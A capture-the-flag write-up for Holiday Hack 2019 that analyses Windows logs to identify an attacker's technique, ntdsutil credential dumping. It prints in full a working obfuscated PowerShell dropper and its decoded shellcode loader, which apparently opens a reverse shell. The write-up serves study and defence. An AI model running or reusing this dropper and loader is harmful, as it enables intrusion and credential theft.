<!DOCTYPE html5>
<html>
	<head>
		<title>determinte-attacker-technique | Holiday Hack 2019</title>
		<link rel="stylesheet" href="/css/common.css">
		<link rel="stylesheet" href="/css/writeup.css">
		<link rel="stylesheet" href="/css/pygments.css">
		<link rel="stylesheet" href="https://unpkg.com/normalize.css@8.0.1/normalize.css">
		
		<meta charset="utf-8" />
	</head>
	<body>
		<main>
			<h1>Windows Log Analysis: Determine Attacker Technique</h1>
<p>What looks like the most helpful part of these logs are the <code>process</code> event types, so we can look at the <code>command_line</code> attribute of each object. </p>
<p>The first thing we see is a bunch of calls to <code>evtutil</code> which seem to be clearing a bunch of different event types. This implies the attacker has already stopped the event service and so has admin privilleges.</p>
<p>We then see <code>services.exe</code> start a service named <code>KnKvTkXn</code>. This makes a new process with the following <code>command_line</code>:</p>
<div class="codehilite"><pre><span></span><span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">b</span> <span class="p">/</span><span class="n">c</span> <span class="nb">start </span><span class="p">/</span><span class="n">b</span> <span class="p">/</span><span class="n">min</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-nop</span> <span class="n">-w</span> <span class="n">hidden</span> <span class="n">-noni</span> <span class="n">-c</span> <span class="s2">&quot;if([IntPtr]::Size -eq 4){$b=&#39;powershell.exe&#39;}else{$b=$env:windir+&#39;\syswow64\WindowsPowerShell\v1.0\powershell.exe&#39;};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=&#39;-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&#39;&#39;H4sIACHe010CA7VWbW/aSBD+nEj5D1aFZFshGANt2kiVbs07wQnEQCAUnTb22iysvWCvCabtf78x4DS9plV70ll5We/OzM4888yM3TiwBeWBhEsD6fPZ6UkPh9iXlBy13w3yUi5h60A9OYGDnN2VPkrKFK1WNe5jGsyurqpxGJJAHN4LTSJQFBH/kVESKar0Rbqfk5Bc3D4uiC2kz1Lu70KT8UfMjmJJFdtzIl2gwEnPutzGqS8Fa8WoUORPn2R1eqHPCvV1jFmkyFYSCeIXHMZkVfqqphcOkhVRZJPaIY+4Kwr3NCiXCsMgwi65AWsbYhIx504kqxAD/IRExGEgQTSp+uFQkWHZC7mNHCckUSTnpWlqeDqb/aVMj7fexYGgPim0A0FCvrJIuKE2iQotHDiM3BF3BlqWCGngzVQVxDZ8SZRcEDOWl/7EjHJDnjLMfldJeakEUj0RqnnI4g9RmtyJGTnoya+4uc+7Ck+We4Dt69np2ambEYWuX/IEVifT/ZqAa0qPR3Qv9VEq5iUTrsGChwm85gZhTNTZM7BSbuHkf66tZ6IguClh2JmOOHVmoHFMZM63rGa6/3NC1ohLA1JLAuxTO+Oc8hq+xGVkH14hE7sBnxT5eECcGmHEwyLFLE3zD2p1n4pnXSOmzCEhsiFHEXgF6VO/d+aQBkVuBybxAaDDO/Au5wLTSSZ9ZHeS3Z6+g5BcZTiK8lIvhlKz85JFMCNOXkJBRI9HKBZ8v5S/uWvGTFAbRyIzN1MzHI/3VXkQiTC2IWcQ+8BaEZtilkKRl1rUIUZiUS+7V34ViCpmDEoALG0gEbCTAmCJlAkhuAhZVwsWEW1/xYgPEvuKbzDsQX0fab4nDvaII//bv4zIB9amSGQQvPAO0msxLvLSiIYCGkeKKlDov9z9ol/svaiG5JgFJauLqZGIlM+5qDRItikfj5jsEQgFRN8IuW/giLyrHNqD8ka7pVUEz6QdMNM2llRHT1Rvm/A7pOU2r106151FSwtr27mL2lHbbPVq/VarsulYo4qw6m1x3WsLsz5eLCzUuhtOxEMbtQa0uJxUdqsO3Vld5Ey22rudsXsqGtvdwnPcSc11vUvXutPfNmj3vto3iiXcrdXj7r3xZBQrUZ0+tfp02F92GuJxMmJ46GreWP+A6bYbLkY6N3dthJrzsr3ruKPm3HSSSYuShVbs0j7qI3Rt3w2HTW/lNSOkfRitq/4CrRsYYdRG9VHSecuM/rBhoGHd6ONb3iuf1zT9wVnXGw9j3PGZ02xp+mSMHBRqA2+uX97OgxQn7BlrI5VB3YekoYFMr4JalRLdPaz7TQ/VQWbkc4QbdDk8H4PNmwHo3A91hyMRtMeaNvI0D7nWfIKRAdLGGjUMXk3e98yeNhqV5vrjUp+Dz2S8eW920HnD7mmadu4/wl8N2eZqG4yNp8uN17L4Nb7Go81DWdMHT00XrdH5uaEbj6JVL3c2cO9A+zD8+CYlEDAoZ/PhC1r8rJWbOIzmmAFdoEtnBdrgYePYd3ucphqKkg7qJQkDwmDQwSjMaI4Y43ba9KFBw7g5DIF0Jg1hWS69ulKlZ0H12zDItq6uHsBFqJs9tQtdEnhini9uy8UiNPfitlKEEH8/ripfJcrBVj6dDikwz8bZ3riaVlTONd/q1v8K2bGO5/DP+TVk3/Z+cfpbMBbz+4B/2P1+448Q/dOw7zEVIGhBD2LkMAFfi/7IjRdfB/uMQObd45N+293G4uIGvhrOTv8BxRZ9dEQKAAA=&#39;&#39;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&#39;;$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=&#39;Hidden&#39;;$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);&quot;</span>
</pre></div>


<p>This is a dropper that's just decoding and decompressing some code, it's easier to understand if you cut out a lot of the powershell-ness:</p>
<div class="codehilite"><pre><span></span><span class="n">StartProcess</span><span class="p">(...,</span> <span class="n">Script</span><span class="p">(</span><span class="n">Gzip_UNCOMPRESS</span><span class="p">(</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s2">&quot;BLAHBLAHBLAH&quot;</span><span class="p">))))</span>
</pre></div>


<p>Since this is a powershell script we can put the base64 into <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Gunzip()&amp;input=SDRzSUFLbmUwMTBDQTdWV2JXL2FTQkQrbkVqNUQxYUZoSzBRakFOdG1raVZiczJiSVRpQkdNeGIwV2xqcjgzQzJnWjdEWmhlLy91TkFhZXBtdDYxSjUyVmwvWHV6T3pNTTgvTTJJbDlpOVBBRjJKZGFRaGZMczdQdWpqRW5pRG1hT1ZEUWNqdHpZUno2ZXdNRG5LYjdXNzRLSHdTeENsYXJXcUJoNmsvdTd1cnhtRklmSDU4THpZSlIxRkV2R2RHU1NSS3dsL0NjRTVDY3ZYNHZDQVdGNzRJdVQrTFRSWThZM1lTUzZyWW1oUGhDdmwyZXRZSkxKejZVelJXakhJeC8vbHpYcHBlS2JOaWZSMWpGb2w1STRrNDhZbzJZM2xKK0NxbEYvYVRGUkh6T3JYQ0lBb2NYaHhTdjN4ZEhQZ1Jkc2dEV05zUW5mQjVZRWQ1Q2NLQW41RHdPUFNGWTBDcGhlTzVtSWRsTnd3c1pOc2hpYUo4UVppbXRxZXoyUi9pOUhUeFUreHo2cEZpeStja0RGWUdDVGZVSWxGUnc3N055Qk54WnFCbDhKRDY3a3lTUUd3VExJbVk4MlBHQ3NMdm1CRWZ5RGFEN1ZlVnhOZEtJTlhsb1ZTQVhMNFZxQjdZTVNOSDFmd2JucVlFa09CNUlRR0E5L1hpL09MY3lTampkMjVmTXdaV1o5UERtb0I3WWplSTZFSHNrMUFxQ0RyY2cza1FKdkNhNjRjeGtXWXY0QXE1WmQyZ2haL3JLNWt3aUhxbS9lY0E5cVptUU8wWjZKeHlta3MyNmU3UG1Wa2pEdlZKTGZHeFI2Mk1mT0piS0JPSGtVT0V4VXpzQVh3Uzg2Y0RZdGNJSXk3bUtXeHBzbjlRcTN1VXYraXFNV1UyQ1pFRm1ZckFLMGlpOUwwengweUkrWmF2RXc4Z09yNEQrM0lPVUo1azBpZWFKOW50NlRzSTVhc01SMUZCNk1aUWMxWkJNQWhteEM0SXlJL282UWpGUERnczg5L2MxV1BHcVlVam5wbWJTVWNVVDdkVkF6L2lZV3hCemlEeXZyRWlGc1VzQmFJZ2FOUW1hbUpRTjdzMS95WU1WY3dZbEFGWTJrQWFZQ2NOMytBcEUwSnc4SkIxcVdnUTN2SldqSGdnY3lqOUJzTXVGUHFKN0FmcVlKZlkrZS85eTVoOHBHMktRd2JBSys4Z3VRWUxlRUV3YWNpaGY2U1lIZ2owMzI1LzFUckFqMnBJVGxrUXM5S1lxZ2xQR1oyenJaU01KMGdPQUlRY2dtK0VnYWZpaUh5b0hEdUUrRTUrcEZVRXo3amxNOTFTbDFSQlc2cTBkUGdkMEhJcnFOM1k5KzJGSm9lMTNkeEJyYWlsYTkxYVQ5TXFtN1poVnJoUmIvSDdib3ZyOWRGaVlTRHRhVERta3hiUytyUzBIRmYycXpiZEd4MWtqM2Z5aDcyNjM1YlUzWDdoMnM2NDVqanVqV004S2U4YnRET3M5dFRTTmU3VTZuRm5xRzdWVWlXcTA2M1dvNFBlc3QzZ3oyT1Q0WUVqdXlQbEZ0TmRKMXlZU3FEdld3ZzE1MlZyMzNiTTVseTNrN0ZHeVVJdWRXZ1A5UkM2dDU0R2c2YTdjcHNSa20vTmRkVmJvSFVESTR4YXFHNG03ZmRNN1EwYUtoclUxUjUrRExybHk1cXNUT3gxdlRFWjRiYkg3S1ltSytNUnNsRW85OTI1Y3ZNNDkxT2NzS3V1MVZRR2RTWkpRd2FaYmdWcGxXdTZuNng3VFJmVlFjYjBBb1FiZERtNEhJSE5oejdvREFlS0hTRHV0MGF5YkxxeWl4eGpQc1pJQldsMWpScHFVRTArZHZXdWJKclhjK1Y1cWN6Qlp6TGFmTlRiNkxKaGRXVlp2dlNlNGErTUxIMjE4MGZxOW1iamFrWndqKyt4dVptVVphVy9iVHBvalM0dlZVVjk1bHE5M043QXZYMzVkdkRwWGNvZElFOHVxSG12YVBHemJxN2pNSnBqQm5TQkxwMVZaeU1JRzZlKzJ3MW9xaUdLaDVHOUpLRlBHTXc3bUlnWnpSRmpnWlUyL3JSRHc4dzVUb0owTUExZ1diNStjeVVKTDRMU3QzR1FiZDNkVGNCSktCdmJLbmFJNy9KNW9iUXJsMHJRMmt1N1Nna2kvUFd3cXNFcUVjRlFJUjBNS1NoSHMreGdWa3JyS01lMHllai9oZXBVdlhQNFovOExWTi8yL3VIMGwrQXJGUTdoL3JENy9jWnZnZm5iZ1E4eDVTQnBRUHRoNURqNTNvei94SXBYWHdacFVpRHJ6dWxKUCs0ZVkzNzFBQjhNRitkL0E2MGhidnhKQ2dBQQ) and have a look at what it's doin">cyberchef</a>:</p>
<div class="codehilite"><pre><span></span><span class="k">function</span> <span class="n">uM1F</span> <span class="p">{</span>
    <span class="k">Param</span> <span class="p">(</span><span class="nv">$i46</span><span class="p">,</span> <span class="nv">$zVytt</span><span class="p">)</span>        
    <span class="nv">$vwxWO</span> <span class="p">=</span> <span class="p">(</span><span class="no">[AppDomain]</span><span class="p">::</span><span class="n">CurrentDomain</span><span class="p">.</span><span class="n">GetAssemblies</span><span class="p">()</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">GlobalAssemblyCache</span> <span class="o">-And</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Location</span><span class="p">.</span><span class="n">Split</span><span class="p">(</span><span class="s1">&#39;\\&#39;</span><span class="p">)[-</span><span class="n">1</span><span class="p">].</span><span class="n">Equals</span><span class="p">(</span><span class="s1">&#39;System.dll&#39;</span><span class="p">)</span> <span class="p">}).</span><span class="n">GetType</span><span class="p">(</span><span class="s1">&#39;Microsoft.Win32.UnsafeNativeMethods&#39;</span><span class="p">)</span>

    <span class="k">return</span> <span class="nv">$vwxWO</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="s1">&#39;GetProcAddress&#39;</span><span class="p">,</span> <span class="no">[Type[]]</span><span class="p">@(</span><span class="no">[System.Runtime.InteropServices.HandleRef], [String]</span><span class="p">)).</span><span class="n">Invoke</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span> <span class="p">@(</span><span class="no">[System.Runtime.InteropServices.HandleRef]</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">InteropServices</span><span class="p">.</span><span class="n">HandleRef</span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">IntPtr</span><span class="p">),</span> <span class="p">(</span><span class="nv">$vwxWO</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="s1">&#39;GetModuleHandle&#39;</span><span class="p">)).</span><span class="n">Invoke</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span> <span class="p">@(</span><span class="nv">$i46</span><span class="p">)))),</span> <span class="nv">$zVytt</span><span class="p">))</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">nL9</span> <span class="p">{</span>
    <span class="k">Param</span> <span class="p">(</span>
        <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Position</span> <span class="p">=</span> <span class="n">0</span><span class="p">,</span> <span class="k">Mandatory</span> <span class="p">=</span> <span class="nv">$True</span><span class="p">)]</span> <span class="no">[Type[]]</span> <span class="nv">$kESi</span><span class="p">,</span>
        <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Position</span> <span class="p">=</span> <span class="n">1</span><span class="p">)]</span> <span class="no">[Type]</span> <span class="nv">$mVd_U</span> <span class="p">=</span> <span class="no">[Void]</span>
    <span class="p">)</span>

    <span class="nv">$yv</span> <span class="p">=</span> <span class="no">[AppDomain]</span><span class="p">::</span><span class="n">CurrentDomain</span><span class="p">.</span><span class="n">DefineDynamicAssembly</span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">AssemblyName</span><span class="p">(</span><span class="s1">&#39;ReflectedDelegate&#39;</span><span class="p">)),</span> <span class="no">[System.Reflection.Emit.AssemblyBuilderAccess]</span><span class="p">::</span><span class="n">Run</span><span class="p">).</span><span class="n">DefineDynamicModule</span><span class="p">(</span><span class="s1">&#39;InMemoryModule&#39;</span><span class="p">,</span> <span class="nv">$false</span><span class="p">).</span><span class="n">DefineType</span><span class="p">(</span><span class="s1">&#39;MyDelegateType&#39;</span><span class="p">,</span> <span class="s1">&#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;</span><span class="p">,</span> <span class="no">[System.MulticastDelegate]</span><span class="p">)</span>
    <span class="nv">$yv</span><span class="p">.</span><span class="n">DefineConstructor</span><span class="p">(</span><span class="s1">&#39;RTSpecialName, HideBySig, Public&#39;</span><span class="p">,</span> <span class="no">[System.Reflection.CallingConventions]</span><span class="p">::</span><span class="n">Standard</span><span class="p">,</span> <span class="nv">$kESi</span><span class="p">).</span><span class="n">SetImplementationFlags</span><span class="p">(</span><span class="s1">&#39;Runtime, Managed&#39;</span><span class="p">)</span>
    <span class="nv">$yv</span><span class="p">.</span><span class="n">DefineMethod</span><span class="p">(</span><span class="s1">&#39;Invoke&#39;</span><span class="p">,</span> <span class="s1">&#39;Public, HideBySig, NewSlot, Virtual&#39;</span><span class="p">,</span> <span class="nv">$mVd_U</span><span class="p">,</span> <span class="nv">$kESi</span><span class="p">).</span><span class="n">SetImplementationFlags</span><span class="p">(</span><span class="s1">&#39;Runtime, Managed&#39;</span><span class="p">)</span>

    <span class="k">return</span> <span class="nv">$yv</span><span class="p">.</span><span class="n">CreateType</span><span class="p">()</span>
<span class="p">}</span>

<span class="no">[Byte[]]</span><span class="nv">$dc</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s2">&quot;/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqFaAaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=&quot;</span><span class="p">)</span>

<span class="nv">$oDm</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">((</span><span class="n">uM1F</span> <span class="n">kernel32</span><span class="p">.</span><span class="n">dll</span> <span class="n">VirtualAlloc</span><span class="p">),</span> <span class="p">(</span><span class="n">nL9</span> <span class="p">@(</span><span class="no">[IntPtr], [UInt32], [UInt32], [UInt32]</span><span class="p">)</span> <span class="p">(</span><span class="no">[IntPtr]</span><span class="p">))).</span><span class="n">Invoke</span><span class="p">(</span><span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span><span class="p">,</span> <span class="nv">$dc</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span><span class="n">0x3000</span><span class="p">,</span> <span class="n">0x40</span><span class="p">)</span>
<span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">Copy</span><span class="p">(</span><span class="nv">$dc</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$oDm</span><span class="p">,</span> <span class="nv">$dc</span><span class="p">.</span><span class="n">length</span><span class="p">)</span>

<span class="nv">$lHZX</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">((</span><span class="n">uM1F</span> <span class="n">kernel32</span><span class="p">.</span><span class="n">dll</span> <span class="n">CreateThread</span><span class="p">),</span> <span class="p">(</span><span class="n">nL9</span> <span class="p">@(</span><span class="no">[IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]</span><span class="p">)</span> <span class="p">(</span><span class="no">[IntPtr]</span><span class="p">))).</span><span class="n">Invoke</span><span class="p">(</span><span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$oDm</span><span class="p">,</span><span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span><span class="p">)</span>
<span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">((</span><span class="n">uM1F</span> <span class="n">kernel32</span><span class="p">.</span><span class="n">dll</span> <span class="n">WaitForSingleObject</span><span class="p">),</span> <span class="p">(</span><span class="n">nL9</span> <span class="p">@(</span><span class="no">[IntPtr], [Int32]</span><span class="p">))).</span><span class="n">Invoke</span><span class="p">(</span><span class="nv">$lHZX</span><span class="p">,</span><span class="n">0xffffffff</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span>
</pre></div>


<p>The key things we see here are another base64 string, as well as calls to functions from <code>kernel32.dll</code>: <code>GetProcAddress</code>, <code>VirtualAlloc</code> &amp; <code>CreateThread</code>. This looks a lot like code for DLL injection.</p>
<p>Though it's heavily obfuscated, we can still try to search for where this code is from: Googling for <a href="https://www.google.com/search?ei=8sT3XZnYEoeO8gKkyLBQ&amp;q=%5BSystem.Runtime.InteropServices.Marshal%5D%3A%3AGetDelegateForFunctionPointer&amp;oq=%5BSystem.Runtime.InteropServices.Marshal%5D%3A%3AGetDelegateForFunctionPointer&amp;gs_l=psy-ab.3..0j0i22i30.12331.13836..13931...2.0..0.192.1069.0j6......0....1j2..gws-wiz.....0..0i30.ZTKeiFd9N0c&amp;ved=0ahUKEwiZmanH3rrmAhUHh1wKHSQkDAoQ4dUDCAs&amp;uact=5"><code>[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer</code></a> gives us <a href="https://isc.sans.edu/forums/diary/Fileless+Malicious+PowerShell+Sample/23081/">a post on the SANS ISC forums</a> with a very similar script. But this still isn't relevant to the actual challenge.</p>
<p>After the DLL injection we see a ton of <code>net use</code> commands, which look like the attacker password spraying localhost. If we keep going however, we see a call to <code>ntdsutil.exe</code>.</p>
<p>This is a tool that's meant to be used for creating backups of SYSTEM &amp; SAM hives, which together can be decoded to get raw password hashes. It's got a lot of legitimate uses, but in this case we see it being used to create a full backup of everything which the attacker will likely go on to try cracking offline.</p>
<p>The answer to the question is <code>ntdsutil</code></p>
		</main>

		<footer>
			<div class="links">
				<div>
					<a aria-label="Back" href="index.html">
						<span class="iconify" data-icon="fa:arrow-left"></span>
					</a>
				</div>
				<div>
			</div>
		</footer>

		<script src="https://code.iconify.design/1/1.0.3/iconify.min.js"></script>
	</body>
</html>